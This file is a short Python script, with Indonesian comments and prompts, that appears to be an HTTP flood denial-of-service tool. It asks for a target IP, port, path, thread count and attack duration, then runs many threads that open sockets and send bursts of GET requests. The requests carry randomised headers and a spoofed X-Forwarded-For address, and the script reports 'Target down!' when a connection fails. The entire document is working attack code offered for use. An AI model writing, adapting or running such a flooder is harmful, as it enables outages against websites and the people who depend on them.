import random
import socket
import time
import threading

def spoof():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def attack(target_ip, target_port, target_path, num_threads, num_seconds):
    while True:
        try:
            # buat koneksi ke target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))

            # kirim request
            for i in range(64):
                s.send(f"GET {target_path} HTTP/1.1\r\nHost: {target_host}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: {random.choice(acceptrand)}\r\nConnection: {random.choice(randconnection)}\r\nX-Forwarded-For: {spoof()}\r\n\r\n".encode())

            # tutup koneksi
            s.close()

        except Exception as e:
            # notifikasi jika target down
            print(f"Target down! Error: {e}")
            break

# baca input dari pengguna
target_ip = input("Masukkan alamat IP target: ")
target_port = int(input("Masukkan port target: "))
target_path = input("Masukkan path target: ")
num_threads = int(input("Masukkan jumlah thread: "))
num_seconds = int(input("Masukkan durasi serangan (detik): "))

# setup variabel
target_host = socket.gethostbyaddr(target_ip)[0]
acceptrand = ["gzip", "*", "identity", "deflate", "compress", "br"]
randconnection = ["keep-alive", "close"]

# buat thread untuk serangan
threads = []
for i in range(num_threads):
    t = threading.Thread(target=attack, args=(target_ip, target_port, target_path, num_threads, num_seconds))
    t.daemon = True
    threads.append(t)
    t.start()

# tunggu selama num_seconds detik
time.sleep(num_seconds)

# notifikasi jika selesai
print("Serangan selesai.")
